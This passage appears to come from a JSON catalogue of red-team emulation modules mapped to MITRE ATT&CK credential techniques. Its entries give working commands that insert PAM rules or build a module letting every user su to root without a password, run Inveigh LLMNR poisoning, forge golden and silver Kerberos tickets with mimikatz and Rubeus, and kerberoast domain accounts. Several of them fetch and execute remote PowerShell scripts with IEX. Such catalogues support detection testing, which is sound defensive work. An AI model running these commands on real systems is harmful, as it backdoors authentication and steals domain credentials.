          "description": "Path to DLL to be installed and registered as additional authentication package",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1556.002\\bin"
        },
        {
          "name": "dll_name",
          "description": "Name of the Password Filter",
          "type": "string",
          "default_value": "RAGLOXRedTeamPWFilter.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "RAGLOXRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
          "check_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox/rx_modules/T1556.002/bin/RAGLOXRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"
        }
      ],
      "rx_module_id": "91580da6-bc6e-431b-8b88-ac77180005f2",
      "module_name": "Install Additional Authentication Packages"
    },
    {
      "index": 1455,
      "technique_id": "T1556.003",
      "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
      "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "elevation_required": true,
        "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
      },
      "variables": [
        {
          "name": "path_to_pam_conf",
          "description": "PAM config file to modify.",
          "type": "string",
          "default_value": "/etc/pam.d/su-l"
        },
        {
          "name": "pam_rule",
          "description": "Rule to add to the PAM config.",
          "type": "string",
          "default_value": "auth sufficient pam_succeed_if.so uid >= 0"
        },
        {
          "name": "index",
          "description": "Index where the rule is inserted.",
          "type": "integer",
          "default_value": 1
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4b9dde80-ae22-44b1-a82a-644bf009eb9c",
      "module_name": "Malicious PAM rule"
    },
    {
      "index": 1456,
      "technique_id": "T1556.003",
      "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
      "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "elevation_required": true,
        "cleanup_command": "sudo sed -i \"\" \"/#{pam_rule}/d\" #{path_to_pam_conf}\n"
      },
      "variables": [
        {
          "name": "path_to_pam_conf",
          "description": "PAM config file to modify.",
          "type": "string",
          "default_value": "/etc/pam.d/su"
        },
        {
          "name": "pam_rule",
          "description": "Rule to add to the PAM config.",
          "type": "string",
          "default_value": "auth sufficient pam_succeed_if.so uid >= 0"
        },
        {
          "name": "index",
          "description": "Index where the rule is inserted.",
          "type": "integer",
          "default_value": 8
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b17eacac-282d-4ca8-a240-46602cf863e3",
      "module_name": "Malicious PAM rule (freebsd)"
    },
    {
      "index": 1457,
      "technique_id": "T1556.003",
      "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
      "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "elevation_required": true,
        "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
      },
      "variables": [
        {
          "name": "path_to_pam_conf",
          "description": "PAM config file to modify.",
          "type": "string",
          "default_value": "/etc/pam.d/su-l"
        },
        {
          "name": "pam_rule",
          "description": "Rule to add to the PAM config.",
          "type": "string",
          "default_value": "auth sufficient /tmp/pam_evil.so"
        },
        {
          "name": "index",
          "description": "Index where the rule is inserted.",
          "type": "integer",
          "default_value": 1
        },
        {
          "name": "path_to_pam_module_source",
          "description": "Path to PAM module source code.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1556.003/src/pam_evil.c"
        },
        {
          "name": "path_to_pam_module",
          "description": "Path to PAM module object",
          "type": "path",
          "default_value": "/tmp/pam_evil.so"
        }
      ],
      "prerequisites": [
        {
          "description": "The PAM development library must be installed to build the PAM module\n",
          "check_command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n"
        },
        {
          "description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
          "check_command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}\n"
        }
      ],
      "rx_module_id": "65208808-3125-4a2e-8389-a0a00e9ab326",
      "module_name": "Malicious PAM module"
    },
    {
      "index": 1458,
      "technique_id": "T1557.001",
      "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
      "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This RAGLOX will run continuously until you cancel it or it times out.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "deecd55f-afe0-4a62-9fba-4d1ba2deb321",
      "module_name": "LLMNR Poisoning with Inveigh (PowerShell)"
    },
    {
      "index": 1459,
      "technique_id": "T1558.001",
      "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
      "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain_sid",
          "description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID",
          "type": "string",
          "default_value": "S-1-5-21-DEFAULT"
        },
        {
          "name": "domain",
          "description": "Targeted Active Directory domain FQDN",
          "type": "string",
          "default_value": "%userdnsdomain%"
        },
        {
          "name": "account",
          "description": "Account to impersonate",
          "type": "string",
          "default_value": "goldenticketfakeuser"
        },
        {
          "name": "krbtgt_aes256_key",
          "description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
          "type": "string",
          "default_value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "9726592a-dabc-4d4d-81cd-44070008b3af",
      "module_name": "Crafting Active Directory golden tickets with mimikatz"
    },
    {
      "index": 1460,
      "technique_id": "T1558.001",
      "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
      "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domaincontroller",
          "description": "Targeted Active Directory domain FQDN",
          "type": "string",
          "default_value": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""
        },
        {
          "name": "account",
          "description": "Account to impersonate",
          "type": "string",
          "default_value": "$ENV:username"
        },
        {
          "name": "krbtgt_aes256_key",
          "description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
          "type": "string",
          "default_value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
        },
        {
          "name": "local_folder",
          "description": "Local path of Rubeus executable",
          "type": "path",
          "default_value": "$Env:temp"
        },
        {
          "name": "local_executable",
          "description": "name of the rubeus executable",
          "type": "string",
          "default_value": "rubeus.exe"
        },
        {
          "name": "rubeus_url",
          "description": "URL of Rubeus executable",
          "type": "url",
          "default_value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        },
        {
          "description": "Rubeus must exist\n",
          "check_command": "if(Test-Path -Path #{local_folder}\\#{local_executable}) {exit 0} else {exit 1}\n",
          "install_command": "Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"
        }
      ],
      "rx_module_id": "e42d33cd-205c-4acf-ab59-a9f38f6bad9c",
      "module_name": "Crafting Active Directory golden tickets with Rubeus"
    },
    {
      "index": 1461,
      "technique_id": "T1558.002",
      "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket",
      "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S #{target}.#{domain}\n  schtasks /query /S #{target}.#{domain}\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain_sid",
          "description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID",
          "type": "string",
          "default_value": "S-1-5-21-DEFAULT"
        },
        {
          "name": "domain",
          "description": "Targeted Active Directory domain FQDN",
          "type": "string",
          "default_value": "%userdnsdomain%"
        },
        {
          "name": "account",
          "description": "Account to impersonate",
          "type": "string",
          "default_value": "silverticketfakeuser"
        },
        {
          "name": "target",
          "description": "System you want to target (Default will be logon server)",
          "type": "string",
          "default_value": "%logonserver:\\\\=%"
        },
        {
          "name": "service_aes256_key",
          "description": "AES256 key (you will need to set to match your service key for your target)",
          "type": "string",
          "default_value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "385e59aa-113e-4711-84d9-f637aef01f2c",
      "module_name": "Crafting Active Directory silver tickets with mimikatz"
    },
    {
      "index": 1462,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "3f987809-3681-43c8-bcd8-b3ff3a28533a",
      "module_name": "Request for service tickets"
    },
    {
      "index": 1463,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "local_folder",
          "description": "Local path of Rubeus executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads"
        },
        {
          "name": "local_executable",
          "description": "name of the rubeus executable",
          "type": "string",
          "default_value": "rubeus.exe"
        },
        {
          "name": "out_file",
          "description": "file where command results are stored",
          "type": "string",
          "default_value": "rubeus_output.txt"
        },
        {
          "name": "rubeus_url",
          "description": "URL of Rubeus executable",
          "type": "url",
          "default_value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
        },
        {
          "name": "flags",
          "description": "command flags you would like to run (optional and blank by default)",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        },
        {
          "description": "Rubeus must exist\n",
          "check_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n"
        }
      ],
      "rx_module_id": "14625569-6def-4497-99ac-8e7817105b55",
      "module_name": "Rubeus kerberoast"
    },
    {
      "index": 1464,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "setspn -T #{domain_name} -Q */*\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain_name",
          "description": "The Domain Name to lookup against",
          "type": "string",
          "default_value": "%USERDNSDOMAIN%"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "e6f4affd-d826-4871-9a62-6c9004b8fe06",
      "module_name": "Extract all accounts in use as SPN using setspn"
    },
    {
      "index": 1465,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "988539bc-2ed7-4e62-aec6-7c5cf6680863",
      "module_name": "Request A Single Ticket via PowerShell"
    },
    {
      "index": 1466,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain_name",
          "description": "The Domain Name to lookup against",
          "type": "string",
          "default_value": "%USERDNSDOMAIN%"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "902f4ed2-1aba-4133-90f2-cff6d299d6da",
      "module_name": "Request All Tickets via PowerShell"
    },
    {
      "index": 1467,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "Kerberoasting technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "78d10e20-c874-45f2-a9df-6fea0120ec27",
      "module_name": "WinPwn - Kerberoasting"
    },
    {
      "index": 1468,
      "technique_id": "T1558.003",
      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
      "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "29094950-2c96-4cbd-b5e4-f7c65079678f",
      "module_name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
    },
    {
      "index": 1469,
      "technique_id": "T1558.004",
      "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
      "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "local_folder",
          "description": "Local path of Rubeus executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads"
        },
        {
          "name": "local_executable",
          "description": "name of the rubeus executable",
          "type": "string",
          "default_value": "rubeus.exe"
        },
        {
          "name": "out_file",
          "description": "file where command results are stored",
          "type": "string",
          "default_value": "rubeus_output.txt"
        },
        {
          "name": "rubeus_url",
          "description": "URL of Rubeus executable",
          "type": "url",
          "default_value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        },
        {
          "description": "Rubeus must exist\n",
          "check_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"
        }
      ],
      "rx_module_id": "615bd568-2859-41b5-9aed-61f6a88e48dd",
